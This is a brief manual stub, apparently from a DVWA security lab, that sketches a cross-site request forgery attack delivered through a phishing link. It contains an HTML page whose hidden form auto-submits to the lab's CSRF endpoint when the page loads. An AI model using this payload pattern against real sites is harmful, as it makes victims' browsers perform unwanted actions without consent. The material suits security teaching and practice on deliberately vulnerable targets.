# Manual

TODO: Demonstrate how to leverage a phishing link with HTML file to input the parameters.

```html
<html>
  <body>
    <form action="https://dvwa.local/dvwa/vulnerabilities/csrf/" method="post">
      <input type="hidden" name="parameter" value="<sending_data>" />
      <input type="submit" value="submitbtn" />
    </form>
    <script>
      document.forms[0].submit();
    </script>
  </body>
</html>
```